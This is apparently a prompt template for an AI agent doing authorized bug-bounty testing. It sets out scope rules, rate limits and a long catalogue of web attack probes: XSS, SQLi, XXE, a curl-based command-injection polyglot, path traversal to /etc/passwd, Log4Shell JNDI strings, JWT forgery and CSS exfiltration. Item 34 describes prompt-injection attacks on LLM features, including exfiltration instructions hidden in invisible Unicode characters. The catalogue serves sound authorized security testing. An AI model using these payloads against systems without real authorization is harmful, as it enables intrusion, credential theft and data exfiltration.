# Authorized Bug Bounty / VDP Testing Run

You are assisting with authorized security research under a public bug bounty or vulnerability disclosure program, or against a target the user explicitly asserts they are authorized to test.

**Input (one of):**
- **Mode A — program policy:** {{PROGRAM_URL}} — the program's public policy page (a HackerOne/Bugcrowd/Intigriti page, a self-hosted VDP policy, or a `/.well-known/security.txt`).
- **Mode B — direct target:** {{TARGET_URL}} — a user-supplied domain or URL, accompanied by the user's explicit statement that testing is authorized against it (they own the asset, or hold written permission, a contract, or an engagement letter).

## Step 0: Derive the engagement contract (before ANY request to a target)

**Determine the input mode first.** Mode A → follow steps 1–5 below. Mode B → run steps B1–B4 instead, then step 5.

- **B1. Record the authorization.** Write into `engagement/CONTRACT.md`: the user's exact authorization statement, the basis they claim (owner / contracted tester / employee with permission), the date/time, and any constraints they stated (allowed techniques, data-handling, time windows). If authorization is ambiguous or unstated, ask for it in one line before sending any request; if the user cannot assert authorization, STOP — do not test against unverified authorization.
- **B2. Check for a published policy anyway.** Fetch `/.well-known/security.txt` on the target and look for a linked VDP/bug-bounty policy. If one exists, its rules of engagement, exclusions, and disclosure terms override the standing-rule defaults — record them in `CONTRACT.md`. Its absence is not a blocker; the user's asserted authorization governs.
- **B3. Scope = exactly what the user authorized.** Write the supplied domain/URL to `engagement/scope.txt` annotated `user-authorized`. Confirm breadth with one line: this URL/host only, the apex domain, or all subdomains. Anything surfaced later beyond that (other domains, cloud assets, sibling hosts) is `inferred` and goes through the scope gate.
- **B4. Defaults apply.** With no program severity guidance or exclusions, the standing rules below are the entire rule set; note in `CONTRACT.md` that no policy constraints were supplied. Report-gating language below that references program exclusions/severity guidance falls back to the validation discipline section.

**Mode A steps:**

1. Fetch {{PROGRAM_URL}} and extract, into `engagement/CONTRACT.md`:
   - Program name and operator, and the **date/time the policy was fetched** (scope changes mid-engagement are common — note the snapshot date).
   - **Rules of Engagement**: rate limits, prohibited techniques, data-handling and stop conditions, disclosure policy. Note explicitly whether request smuggling, upload-attack testing, and account registration are permitted — several probes below are gated on these.
   - **In-scope vulnerability classes** and **explicitly out-of-scope classes** (do not spend effort on, or report, excluded classes — many programs exclude CSV injection, clickjacking, and smuggling).
   - **Severity guidance** (what they consider Medium/High), if stated.
2. **Determine scope.** Work through these sources in order and use the first that yields results:
   - A scope section or asset list on the policy page itself.
   - A linked scope/targets page (on HackerOne: append `/policy_scopes`; note these may be JS-paginated — record only what you can actually see).
   - Domains named anywhere in the policy text (the organization's primary domain and any properties it explicitly claims).
   - The domain of {{PROGRAM_URL}} itself, if it belongs to the target organization.
3. Write each in-scope domain/host you identified, one per line, to `engagement/scope.txt`, each annotated (in `CONTRACT.md`) with its source: `policy-listed`, `scope-page`, `user-authorized`, or `inferred`. Wildcards stay as wildcards — no aggressive subdomain enumeration beyond passive sources.
4. **Scope gate:** assets from policy text, a scope page, or the user's explicit authorization may be tested directly. Anything merely *inferred* must be presented to the user for a one-line confirmation before you send it a single probe. In Mode A, if you cannot fetch the policy at all, STOP — do not test against unverified authorization. A missing scope page is NOT a blocker; unverifiable authorization is.
5. **Ownership quarantine:** recon-surfaced assets living in third-party namespaces (S3/GCS buckets, GitHub repos, mobile apps, breach-combo emails) are out of scope until a concrete ownership signal ties them to the target (org account, owned reverse-DNS package, exact owned-domain email match, content referencing confirmed target assets). Quarantine unproven matches — do not probe them.

## Standing rules (a live policy or the user's explicit constraints always win over these defaults)

- Rate limit: use the policy's stated limit; otherwise default to **max 3 requests/second**, `sleep 0.5`–`1` between requests, back off immediately on 429s or WAF escalation.
- Manual, targeted probes only — no aggressive/automated vulnerability scanning, no DoS/DDoS, no brute forcing, no password spraying, no social engineering, no parallel request bursts (race conditions included — use sequential replay instead; see Phase 2 item 54).
- Do not modify or destroy data; access the minimum data needed to prove a finding.
- Stop and report immediately upon unauthorized access to sensitive data, accounts, or command execution. Detection probes stop at the differential/callback — never iterate character-by-character to extract data.
- Append every request sent to `engagement/requests.log` — one line each: timestamp, host, method, path, response status. Programs may ask for your traffic; findings need reproduction.
- All work products go under `engagement/`.
- **Detection awareness**: watch for signs the target's defenses are reacting to you (429s/Retry-After, captcha interstitials, branded WAF pages, 403s served only to your IP). On confirmed blocking, slow down and back off — never rotate IPs or infrastructure to evade an explicit block. If a confirmed finding stops reproducing mid-engagement, preserve the original PoC artifacts, retry with up to 3 alternative vectors (WAF-evasion variants), and document both states ("vulnerable at T0, mitigated at T1") instead of silently retracting.

## Test plan — execute in order

### Phase 1: JS & route mining (local, zero requests)
1. Passive surface mapping: crt.sh subdomains, Wayback/CDX historical URLs, public DNS — resolve which discovered hosts fall inside `scope.txt`; only in-scope hosts proceed. Check discovered hosts for dangling CNAMEs pointing at unclaimed cloud services (Azure, S3, Heroku, GitHub Pages, Fastly) — pure DNS lookups, no target requests. Passive DNS-history may reveal pre-CDN origin IPs; test in-scope hostnames against them only if the policy does not require testing through the CDN.
2. Download the sites' JS bundles (browser User-Agent + Referer if a CDN bot manager blocks plain curl; 1s spacing). Extract: API route strings (including minified `"resource/action"` patterns, not just `/api/v*` URLs), fetch/axios/GraphQL targets, query parameter names, absolute in-scope hostnames, feature-flag/environment endpoints, internal-looking package names (dependency-confusion check), key-like strings (validate context before treating as secrets). GWT apps (`*.nocache.js`): enumerate RPC services locally from the bundle.
3. **Client-side sink audit** (same pass, feeds Phase 2/3): DOM-XSS sources→sinks (`location.hash`/`search`, `window.name`, `postMessage` data → `innerHTML`, `document.write`, `eval`), `postMessage` listeners missing an `event.origin` allowlist, DOM-redirect sinks (`location.href`/`assign()` fed by params), client-side path traversal candidates (user-controlled values interpolated unencoded into `fetch()`/XHR paths), prototype-pollution gadget sinks, and DOM-clobbering targets (`id`/`name` anchors shadowing globals like `config`/`apiUrl` that reach `src`/`href`/`innerHTML` sinks). Note jQuery version — <3.5.0 enables htmlPrefilter mutation XSS (CVE-2020-11022/11023).
4. JS historical diffing: pull older bundle versions from Wayback; endpoints removed from current JS but still live server-side are prime broken-access-control candidates. Also behaviorally diff older API versions (`/v1/` vs `/v2/`): expired-token acceptance and missing rate limits on legacy versions are common.
5. Passive endpoint discovery: `robots.txt`, `sitemap.xml`, exposed `openapi.json`/Swagger, Wayback Machine / Common Crawl (zero requests to target).
6. Build-manifest mining: pull `asset-manifest.json` / Next.js `_buildManifest.js` for the full bundle list, check each bundle's trailing `sourceMappingURL`, reconstruct original source from `.js.map` `sourcesContent`, and grep recovered source for secrets and internal routes; `build-info.json` commit hashes aid CVE targeting.
7. Output a deduplicated target list of (host, path, params) for Phase 2.

### Phase 1.5: Subdomain & HTTP enumeration
1. **Subdomain enumeration (passive-first)**: consolidate candidates from crt.sh, TLS cert SANs, Wayback/CDX, Common Crawl, public DNS records, JS-extracted hostnames, and search-engine results. Resolve each candidate (DNS lookups only) and keep those matching `scope.txt` — wildcard scope entries authorize the hosts passive sources reveal, not dictionary brute forcing. Permutation/bruteforce DNS enumeration only if the policy explicitly allows it; if used, note it in `CONTRACT.md`.
2. **HTTP enumeration**: probe each resolved in-scope host on ports 80/443 (httpx, or a curl loop with `sleep 1`; browser User-Agent). Record status code, page title, `Server`/tech headers, content length, and redirect targets to `sweep/live-hosts.tsv`. Ports beyond 80/443 only if the policy permits. Review titles for exposed admin panels (phpMyAdmin, Jenkins, Grafana, Kibana, Tomcat Manager) — unauthenticated exposure alone is the finding; do NOT try default credentials.
3. **Vhost cross-probes**: resend each live host's homepage with the `Host` header set to each other already-known in-scope hostname (from `scope.txt`, TLS SANs, redirect targets — no wordlists). Different title/length/status per Host value reveals hidden/default vhosts.
4. Feed live hosts into the homepage/header snapshot and Phase 2 targeting. New hostnames surfaced via redirects, vhosts, or TLS cert names go through the scope gate: `policy-listed`/`scope-page`/`user-authorized` → proceed; `inferred` → one-line user confirmation first.
5. **Subdomain-takeover impact escalation**: for any confirmed dangling/taken-over host, check whether it appears in OAuth `redirect_uri` allowlists (auth-code theft), parent-domain cookie scope (`Domain=.target.com` — session fixation), CSP `script-src` (stored-XSS equivalent), CORS origin allowlists (credentialed API read), or email DNS (DKIM selector / SPF include — spoofing that passes auth checks) before reporting.

### Phase 2: Unauthenticated endpoint testing (scope-gated hosts only)
Single targeted requests per endpoint, within the rate limit.

0. **Setup**: stand up an out-of-band callback listener (interactsh, Burp Collaborator, or equivalent) before any blind testing — use a unique subdomain token per endpoint so hits can be attributed. For every probe, capture a **baseline response first** and judge anomalies by delta in status, length, and content-type — not by status code alone. A 200 is not a finding.
   - **Marker discipline**: injected markers must be random 8+ char non-dictionary strings (never `test`, `evil`, `javascript`, your domain); grep the baseline response for the marker before claiming reflection — natural collisions are the top reflection false positive.
   - **Soft-404 control**: before believing any exposed-file hit (`.env`, `.git/config`, actuator, admin panel), fetch a random nonsense path on the same host — identical body/length means an SPA/framework catch-all; discard.
   - **Gated-sibling control**: before claiming missing authentication, capture what correct rejection looks like by hitting a known-protected sibling endpoint on the same stack; a `400 "field X is mandatory"` (not 401) means the request reached business logic without an auth check.
7. **Unauthenticated access control**: request API routes and UI-hidden routes with no session; flag 200s returning sensitive data. Try mutating methods (`PUT`/`DELETE`/`PATCH`) on read-looking endpoints; flag unexpected non-405s. GraphQL: call one read-only-looking mutation/field on a private type without a session. GWT: replay one enumerated RPC method unauthenticated.
8. **403 / routing bypasses** on access-control failures: path normalization (`/api//admin`, `/api/./admin`, `/api/admin/`, `%2e`, case variation, trailing `;` or `.json`), override headers (`X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`), IP-ACL spoof headers (`X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `True-Client-IP`), and on nginx hosts the off-by-slash alias traversal (`/static../<known-file>` on discovered static prefixes). Apply these to `/.git/` paths specifically — `deny all` 403s often still leave objects readable.
9. **Error leakage**: malformed input, wrong types, oversized values — flag stack traces/framework errors leaking internals (verbose errors alone are not reportable without exploitability).
10. **Reflected XSS**: distinctive marker payload (e.g. `pr0be"<>'=XSS`) per parameter; confirm unencoded reflection and exact HTML context before claiming XSS; prove with `alert(document.domain)` (scopes the PoC to the origin). **Blind XSS**: `"><script src=//<OOB-token>></script>` in contact/support forms and as `User-Agent`/`Referer` values (admin-log viewers are classic sinks) — one request per field, attributed via the listener. If a sanitizer/allowlist is present, probe mXSS tag combos (`<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>` — markup safe at sanitize-time that mutates on browser re-parse). In markdown/wiki fields, test Kroki/Mermaid/PlantUML diagram-block injection and RDoc `link:javascript:` — render pipelines often sit outside the HTML sanitizer. On AngularJS 1.x (`ng-app`), probe `{{7*7}}` and escape the sandbox via `constructor.constructor`, with the quoteless `charAt`/`orderBy`/`fromCharCode` variant when string literals are filtered. Where markup injects but script is filtered, test DOM clobbering (`<a id=config><a id=config name=url href=...>`, `<base href>` hijack of relative URLs).
11. **SQLi (light)**: single-quote probe + boolean pair (`AND 1=1` / `AND 1=2`), compare responses. On row-reflecting endpoints prefer UNION over blind — enumerate column count first via `ORDER BY n` / `UNION SELECT NULL,...` ladder (up to ~12); a wrong count silently looks like not-vulnerable. Probe headers too (`User-Agent`, `Referer`, `X-Forwarded-For` — stored into queries surprisingly often, and dodge URL-path WAF rules). On an anomaly, one OOB confirmation (`xp_dirtree '//<token>.listener/a` MSSQL, `LOAD_FILE('\\\\<token>.listener\\a')` MySQL) and/or one error-based banner probe (`CAST((SELECT version()) AS int)`). On ORM stacks, probe raw-fragment injection (Django `values()` JSONField column-alias, Mongoose `populate({match:{$where}})`, `$regex` char-recovery on Meteor-style method calls). No time-based or heavy payloads beyond the header probe; stop at the differential.
12. **SSRF**: URL-accepting parameters (`url`, `callback`, `webhook`, `image`, `feed`, `redirect`, `dest`, `import`, `fetch`) pointed at your callback listener only — never internal addresses. HTML→PDF / report-generation endpoints are high-yield: also probe renderer local-file read with `<iframe src="file:///etc/passwd">` or `window.location="/etc/passwd"` — file content in the returned PDF proves renderer-side access, distinct from URL-SSRF.
13. **SSTI**: `{{7*7}}` / `${7*7}` in reflected fields; check for evaluated `49`. Lead with the polyglot `${{<%[%'"}}%\.`; add `#{7*7}` (Thymeleaf/SpEL), `<%= 7*7 %>` (ERB/EJS); differentiate engines with `{{7*'7'}}` → `7777777` = Jinja2, `49` = Twig; fingerprint with `(1/0)` (error class names the language). PDF/invoice/email-generation inputs are prime surfaces.
14. **Open redirect**: `next`/`return`/`redirect`/`continue` params; flag external Location redirects. On a block, one retry each with `//attacker.example`, `https:attacker.example`, `https://target.com@attacker.example`, unicode-dot `//attacker%E3%80%82example`; also path-embedded redirects (`/redirect/https://attacker.example`).
15. **CORS**: send `Origin: https://probe.example` to API endpoints; also try `Origin: null`, lookalike origins (`https://target.com.evil.example`, `https://eviltarget.com`), unescaped-dot regex bypass (`https://wwwXtarget.com`), and scheme downgrade (`http://target.com`). Flag any reflected `Access-Control-Allow-Origin` combined with `Access-Control-Allow-Credentials: true`.
16. **CRLF injection**: `%0d%0a` in parameters that reflect into response headers or redirect Locations; probe explicitly for injected `Set-Cookie:` (session fixation) and `%0d%0a%0d%0a` response splitting. Flag injected header lines.
17. **XXE**: on XML-accepting endpoints, gate first with an inline entity (`<!ENTITY hello "world!">` + `&hello;`) — no echo means a hardened parser, pivot away. Then a single benign entity-expansion probe, plus blind parameter-entity OOB (`<!ENTITY % x SYSTEM "http://<token>.listener/x"> %x;`), XInclude when no DOCTYPE control (`<xi:include parse="text" href="file:///etc/hostname"/>`), a JSON→XML Content-Type switch on JSON APIs (SAXParse errors reveal a reachable XML parser), full-document UTF-16 encoding to bypass keyword filters, and error-based exfil via a nonexistent-file entity when egress is blocked. No external DTDs pointing at internal hosts.
18. **Command injection (blind, OOB only)**: params likely shelled out server-side (`ip`, `host`, `domain`, `ping`, `file`, `convert`, PDF/image tools) — one polyglot probe `1;curl${IFS}http://<token>.listener;#` covering quote contexts. **Match body encoding to the endpoint** — sending JSON to a form endpoint is silently ignored and causes false negatives. A listener callback attributable to that endpoint's token is the finding; never escalate to shells or file drops.
19. **LFI / path traversal**: filename-ish params (`file`, `path`, `page`, `template`, `doc`, `download`, `include`) — `../../../../etc/passwd`, absolute `/etc/passwd`, `C:\Windows\win.ini`, and on Linux prioritize `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/cwd` (env vars routinely hold cloud keys/DB creds). Evidence is file content in the body (`root:x:0:0:`, `[fonts]`), not a 200. On PHP: any `php://filter` read can upgrade to RCE via iconv filter chains (php_filter_chain_generator — confirm blind via an OOB callback in the forged payload); if wrappers are filtered, try session-file inclusion (poison a stored field, include `sess_<PHPSESSID>`) and `phar://` metadata deserialization on uploaded files.
20. **NoSQL injection**: `{"$ne":null}` / `{"$gt":""}` as JSON bodies and `user[$ne]=x` as urlencoded on login/search APIs; `{"$regex":".*"}` in GraphQL/JSON filter args. An expanded result set or session vs. baseline is the differential; stop there.
21. **LDAP / XPath differentials**: on login, directory-search, or lookup fields — `*` alone (LDAP wildcard), broken-syntax `)(` vs always-true filter, and XPath `' or '1'='1` vs `' or '1'='2`. Result-count/content deltas only.
22. **SSI / ESI injection**: `<!--#echo var="DATE_LOCAL" -->` in reflected fields — evaluated server date is the hit. On hosts fingerprinted as Varnish/Fastly/Akamai/Squid, `<esi:include src="http://<token>.listener/">` — a callback from a CDN edge IP is the hit.
23. **HTTP parameter pollution**: `param=a&param=b` on sensitive params (`redirect`, `amount`, `role`, `debug`, `email`) plus `param[]=v` / `param[key]=v` variants — the app acting on a different occurrence than the validator checked is the finding. Also **server-side parameter pollution**: when the frontend proxies to an internal REST URL (`/api/users/<input>/field/email`), traverse the backend path with `../` / `%2f` and terminate with `%23` (e.g. targeting `/field/passwordResetToken`).
24. **Prototype pollution**: client-side `?__proto__[test]=test` on JS-heavy pages (check `({}).test`, escalate only if a Phase 1 gadget sink exists); server-side on JSON APIs one non-destructive probe `{"__proto__":{"status":510}}` — a changed status/whitespace without reflection is the hit. Also probe `constructor.prototype` keys and qs-style query pollution; confirm only if a later unrelated response reflects the polluted property. Never fire RCE/DoS gadgets.
25. **Hidden parameters**: ~10 hand-picked names (`debug`, `test`, `admin`, `internal`, `dev`, `preview`, plus feature-flag names seen in JS) against a few high-value endpoints at normal pacing; judge against baseline.
26. **ORM leak** (gated on framework fingerprint from Phase 1): Django `?password__startswith=x`, Prisma `?filter[createdBy][email][startsWith]=a`, Rails Ransack `?q[user_reset_password_token_start]=a` — 1–2 requests; a response delta on a field the UI never exposes confirms arbitrary-attribute filtering. Stop at the differential.
27. **XSLT** (on XML/XSL-accepting endpoints): single benign stylesheet with `<xsl:value-of select="system-property('xsl:vendor')"/>`; optionally `document('http://<token>.listener')` for OOB confirmation. Vendor string or callback is the hit; no code-execution payloads.
28. **LaTeX injection** (PDF/report generators): one `\input{/etc/hostname}` in any field landing in a generated PDF; server file content inside the PDF is the hit. No `\write18`.
29. **JSONP / callback leakage**: `?callback=` on API endpoints returning user data — flag endpoints wrapping sensitive data in an attacker-controllable function call (cross-origin exfil without CORS).
30. **Web cache deception/poisoning probes**: append `..;/`, a fake static suffix (`/account/settings/nonexistent.css` — also obscure extensions like `.avif`/`.webmanifest` that bypass CDN cache-deception armor), or delimiter variants (`/settings/profile;x.css`, `%3b`, `%23`); also path-normalization (`/static/..%2fprofile`) and `X-HTTP-Method-Override: HEAD` cloaking (empty HEAD body stored under the GET key). Check whether cached copies expose content (`Cache-Control: public`, `CF-Cache-Status: HIT` on a second, unauthenticated fetch); send unknown parameters/headers and check for unkeyed input reflection in cacheable responses. Probe poisoning only under a unique cache-buster key (`?cb=<rand>`) so live entries are never poisoned.
31. **Security-header / CSP analysis** (passive, on responses already collected): weak or absent CSP is what turns minor reflection into exploitable XSS; note missing `frame-ancestors`/`X-Frame-Options` for clickjacking exposure.
32. **Auth-flow review** (unauthenticated, own email addresses only): password-reset poisoning via `X-Forwarded-Host: <your-callback-host>` on the reset endpoint (reset link built on attacker host is the hit); also dual `Host:` headers, suffix injection (`Host: target.evil.com`), and port/userinfo confusion (`Host: target:1@evil.com`) on reset flows; detect routing-by-Host by sending `Host: <callback-subdomain>` and watching for the proxy's outbound lookup. Reset-parameter pollution (duplicate `email=a&email=b`, JSON array, separator, CRLF cc); reset token leaked in the API response body (not just the email); OAuth/OIDC `redirect_uri` manipulation (suffix-match bypass, chaining a known open redirect on a whitelisted domain, invalid-`scope` filter bypass) and missing `state` (login CSRF); unicode/collation collision checks against your own account.
33. **Type juggling** (PHP hosts only — fingerprint first): resubmit token/hash params as arrays (`token[]=x` — `md5([])`/`strcmp` return NULL); magic hashes (`240610708`, `QNKCDZO`, `"0e0"`) on loosely-compared custom tokens/HMAC cookies. Verification passing with a non-matching input is the hit.
34. **LLM / prompt injection** (only if the target exposes an in-scope LLM/chat feature): one system-prompt-leak probe; one markdown-image OOB probe (`![x](https://<token>.listener/)`) — a listener hit proves data can be driven off-site. Also **indirect injection**: plant an OOB-exfil instruction (optionally encoded in the invisible Unicode Tags block U+E0000–E007F to bypass human review) in an uploaded document or fetchable page the LLM feature ingests; confirm only via OOB callback. No jailbreak libraries, no flooding.
35. **Request smuggling — detection only, and ONLY if the policy does not exclude it**: one benign timing pair (CL.TE / TE.CL) per CDN-fronted host — a reproducible timing differential is the finding. Do not smuggle a second request (poisons other users' traffic); stop at detection.
36. **ViewState offline analysis** (ASP.NET hosts, zero requests): decode collected `__VIEWSTATE` locally (`/wEP` prefix = MAC disabled), run captured blobs offline against known-machine-key lists (badsecrets). A matched key or decodable ViewState is the finding; no forgery payloads.
37. **Insecure deserialization**: if the recon blob sweep found a Java serialized value, one ysoserial **URLDNS** probe (no library dependencies) pointing at the listener — a DNS callback proves deserialization. No other gadget chains. Separately, sweep common headers (`User-Agent`, `X-Forwarded-For`, `Referer`, `X-Api-Version`) with `${jndi:dns://<token>.listener/<header>}` sub-tagged per header for Log4Shell-class JNDI injection.
38. **Vulnerable components**: positively identified library/framework versions checked against known CVEs.

### Phase 2.5: Framework & platform-specific probes (fingerprint-gated, unauthenticated)

- **Next.js**: extract Server Action IDs from HTML/JS bundles (`Next-Action` / `"action":"<hex>"`) and replay one privileged action with no session cookie; pull `buildId` and request protected routes as `/_next/data/<buildId>/<route>.json` and `%5Fnext/data/...` (middleware matcher bypass); diff `__NEXT_DATA__`/bundles for non-`NEXT_PUBLIC_` env vars and server-side props; probe `/api/revalidate?secret=` with common defaults; test `/_next/image?url=` only against your OOB listener — a 400 is allowlist rejection, not a finding.
- **Node/Express**: replay admin or rate-limited requests with `X-Forwarded-For: 127.0.0.1` and rotating fake IPs — `trust proxy` misconfiguration bypasses IP allowlists and per-IP throttles.
- **Laravel**: Whoops/Ignition error page or a 200 on `/_ignition/health-check` flags debug-mode-in-prod; probe `/telescope/api/*` and `/horizon/api/*` anonymously (request logs, queries, env vars, failed-job payloads); `/.env.production`, `/.env.backup`, `/.env.local`, `/storage/logs/laravel.log`; a leaked `APP_KEY` means cookie/session forgery.
- **ASP.NET**: anonymous `/trace.axd` (recent requests incl. Authorization headers) and `/elmah.axd` (error logs incl. connection strings) — retry 403s with `X-Forwarded-For: 127.0.0.1` when the app trusts forwarded headers for `localOnly`; grep pages for `*.svc` endpoints and fetch `?wsdl`/`?mex` anonymously; fingerprint Telerik via POST `/Telerik.Web.UI.WebResource.axd?type=rau` (gates the CVE-2017-11317/2019-18935 family).
- **Spring Boot**: probe alternate actuator bases (`/manage`, `/management`, `/app`) and require actuator-shaped JSON (Whitelabel 200s are false positives); if `/actuator/heapdump` returns a body, download and `strings`-grep for credentials as impact proof; `#{7*7}` SpEL probe in text fields; `/jolokia`, `/actuator/jolokia`, `/h2-console` anonymous exposure.
- **SharePoint/IIS**: fingerprint the build in ≤3 requests (`GET /_vti_inf.html`, `POST /_api/contextinfo` → `LibraryVersion`, `/_layouts/15/start.aspx` body) and map to EoL/unpatched-CVE status; legacy `/_vti_bin/Authentication.asmx` `Mode` op returning `Forms` means anonymous Login calls work — a small burst against synthetic non-existent users with uniform timing/size proves unbounded credential validation without ever cracking a credential.
- **Legacy native-credential endpoints** (behind any branded SSO/MFA login): WP `/xmlrpc.php`, Atlassian `/rest/auth/1/session`, Exchange `/EWS/` and `/Autodiscover/`, Drupal `/user/login?_format=json`, Tomcat `/manager/html` — these often accept native credentials with none of the SSO/MFA/rate-limit wrapping. Verify the absence of controls only; no credential attacks.
- **Jenkins/CI**: `X-Jenkins` response header leaks the exact version; anonymous POST `/scriptText` returning command output is unauthenticated RCE (a login-page response is NOT a finding); on ≤2.441 / LTS ≤2.426.2 test the CLI `@/etc/passwd` pre-auth file read.
- **Kubernetes** (only if the policy permits ports beyond 80/443): probe 6443 (`/version` is anonymous on most clusters), 10250 vs 10255 (10255 read-only; 10250 `/run/<ns>/<pod>/<ctr>` returns output directly), 2379 etcd, 8443 dashboard token-less API, 44134 Tiller. An anonymous 200 with empty `items` is RBAC-filtered, not cluster-admin — confirm with SelfSubjectRulesReview before claiming access.
- **gRPC**: enumerate services via reflection (`grpcurl -plaintext host:50051 list`), call sensitive methods unauthenticated and judge by `grpc-status` trailers (OK = finding, 16/7 = enforced, 3 = callable, 12 = wrong method); inject identity metadata (`x-user-id`, `x-tenant-id`, base64 `-bin` variants) through the public proxy and check the backend honors it; retry discovered RPCs over grpc-gateway REST, grpc-web+json, and Connect JSON transcoders unauthenticated.
- **OData** (`/_api/`, `/odata/`, `/api/data/v9.x/`, `/sap/opu/odata/`): anonymous `$metadata` schema dump, `$filter=startswith(field,'a')` prefix oracle, `$orderby` on columns you can't `$select` (column-ACL bypass), `$expand` navigation-property IDOR, `$batch` multipart to slip past WAF body inspection.
- **mTLS-gated paths**: if the edge terminates client-cert auth and forwards the verdict, spoof `X-SSL-Client-Verify: SUCCESS`, `X-SSL-Client-S-DN: CN=admin`, `X-Forwarded-Client-Cert` — one spoofed request reaching cert-only functionality is the finding.
- **RAG / vector DBs** (if the target exposes AI features): probe exposed vector-DB ports (Chroma 8000, Qdrant 6333, Weaviate 8080, Milvus 19530) for unauthenticated reads; on the RAG API test attacker-controlled `namespace`/`tenant_id` params and sequential document IDs, verified against a same-tenant control; inspect "sources" blocks for other tenants' raw chunk text.

### Phase 3: Authenticated testing — ONLY if the user provides two test-account sessions they own

0. **Auth preflight** (before any Phase 3 test): validate each supplied session with one identity-echo request (`/api/me` or equivalent) and record three things: session is live (200, not 401/403), the account's role/privilege visible in the body (your IDOR/authz baseline identity), and whether it is MFA-gated. A silently-admin or silently-dead session skews every authz finding — abort for re-auth if any check fails.

39. **IDOR/BOLA**: replay account A's object IDs with account B's session on GET/PUT/DELETE; include verb tampering (swap GET→PUT/DELETE), wildcard IDs (`*`, `%`, `_`), type confusion (`{"id":[19]}`), GraphQL Relay `node(id:)` replay, and note whether IDs are sequential, UUIDv1 (timestamp-predictable), or Mongo ObjectIds (generate adjacent IDs locally and probe one or two).
40. **Privilege escalation**: user-role token against privileged routes found in Phase 1.
41. **Stored XSS**: benign marker payloads in profile/display-name/comment fields (include SVG/markdown variants), viewed from the second account; blind-XSS OOB payloads in fields likely viewed by staff. Second-order SQLi: store a quote-bearing value and watch pages/exports that render it on a *different* page. SSI directive in stored fields.
42. **Mass assignment**: extra fields in update bodies — mine `GET` responses for fields the form never shows (`role`, `verified`, `balance`, `plan`) and replay them; also test at registration/object-creation time, not just updates.
43. **CSRF**: state-changing endpoints with missing/weak CSRF tokens, especially combined with `SameSite=None` cookies; nuance probes — swap POST→GET keeping the token, delete the token entirely, replay A's token in B's request, resend with `Referer` removed, and downgrade JSON to `text/plain` (skips preflight). Also: GraphQL mutations via GET query strings (`?query=mutation{...}` skips method-based CSRF validation), path-traversal in the form action to escape token-check scope (`/protected/..%2f..%2funprotected`), and spoofed `Origin`/`Referer` set verbatim from a raw client (many checks are naive string matches). If the session cookie relies on `SameSite=Lax` alone, test state changes via top-level navigation from any sibling subdomain. Demonstrate with your own two accounts only.
44. **Session management**: does logout invalidate the session server-side; do old sessions survive a password change. Fixation: compare the session cookie before/after login — an unchanged value or acceptance of an attacker-supplied ID is fixation. Refresh tokens: rotation on use, replay of an old RT still minting tokens, and whether RT replay kills the rotated family. Does the app session survive IdP logout (single-logout gap); does a device-bound session work with the binding header stripped.
45. **JWT hardening** (tokens you own only): `alg:none` acceptance, null signature (`header.payload.`), `kid` parameter traversal, offline crack of weak HMAC secrets, RS256→HS256 confusion using the public key from `/jwks.json` as the HMAC secret, `jwk`/`jku` header injection (host JWKS on your callback host).
46. **WebSocket auth**: WS endpoints found in Phase 1 replayed without a session and cross-origin. socket.io: namespace/room authz via protocol packets (`40/admin,` CONNECT then `42/admin,["join",{...}]` — never the ignored `?nsp=` param), polling-transport `sid` replay/fixation, and handshake desync (`Sec-WebSocket-Version: 777`). CSWSH counts only when the handshake uses ambient cookies + no per-connection token + no Origin enforcement, proven by receiving a *different account's* frames — a bare `101` is not a finding.
47. **Business logic** (own accounts, no real transactions): numeric-boundary tampering (negative quantities/amounts, out-of-range values), workflow-step skipping (request step N without completing N−1), single-use resource reuse via *sequential* replay (same coupon/invite/vote twice — never in parallel).
48. **File upload** (only if upload-attack testing is permitted): benign acceptance matrix — double extension (`test.jpg.php`), case variant (`.pHp`), trailing chars, mismatched Content-Type, `GIF8;`-prepended content; SVG with a script marker for stored XSS; filename injection (`'"><img>` marker, `../../test.txt`); one Zip Slip archive with an inert marker file. Acceptance + retrieval is the finding — never upload or invoke a webshell.
49. **SAML** (only if SSO is in scope): signature stripping (modify NameID, delete `<ds:Signature>`), XML comment splitting in NameID (`user<!--x-->.evil.com`), one XSW variant, parser-differential XSW (inject a sibling `<Assertion>` so the signature-checking and business-logic parsers resolve different nodes), cross-SP/IdP assertion replay (AudienceRestriction/freshness unchecked), and control-character email suffixes to defeat org-domain enforcement — with your own two accounts.
50. **OAuth code replay**: complete a flow with your own account, replay the same `code` to the token endpoint once — a second successful exchange is the finding.
51. **Clickjacking verification**: serve a local `<iframe>` PoC for state-changing pages (email/password change, payment); the page actually rendering framed with an active session is the finding (framebusters can make missing headers non-exploitable).
52. **CSV injection**: set an own-account field to a leading `=`/`+`/`-`/`@` value, trigger the export — unescaped export is the finding (commonly Low/Info or excluded; check CONTRACT.md before reporting).
53. **CSS injection** (where `<style>`/style attrs are injectable): one single-selector OOB proof (`input[name=csrf][value^="a"]{background:url(//<token>.listener/?q=a)}`) — one listener hit proves the oracle; do NOT iterate the alphabet. Read CSP first: restrictive `img-src`/`style-src`/`connect-src` kills the exfil channel, and a blocked `url()` looks identical to success in DevTools.
54. **Race conditions** (sequential-safe default): replay a one-time action twice *sequentially* — a second success proves missing idempotency/unique-constraint with zero parallelism. Passively flag race candidates (client-side-only submit disabling, optimistic UI before server confirm, missing idempotency keys) and record them. Only if the policy explicitly permits concurrency: use HTTP/2 single-packet last-byte sync, not Repeater send-in-parallel; the minimal-footprint variant is the 2-request partial-construction race (register + blank-token confirm in one window).
55. **MFA bypass battery** (own accounts, no brute forcing): use the pre-MFA session directly against post-auth routes (UI-only enforcement); replay a consumed OTP after re-login (no single-use); submit a dummy OTP (`000000`); tamper the verify response (`{"success":false}`→`true`); probe prefix-by-prefix OTP validation within a single MFA session (correct prefix yields a distinct response); replay remember-device cookies from a new IP/UA; grep `/api/me` and profile objects for exposed backup/recovery codes.
56. **Account-recovery & account-security lifecycle**: reset token usable from a different browser/IP/session than requested (no binding → forwardable link); requesting token#2 fails to invalidate token#1; token reuse after consumption; swapping the account identifier on another user's token (IDOR-in-reset); token leaked in the `Referer` to third-party JS/analytics on the reset landing page or forwarded through a 302 chain; email-change without current-password or old-address confirmation (chain: any profile-edit IDOR → trigger reset → attacker's mailbox); password-change without current-password/MFA step-up.
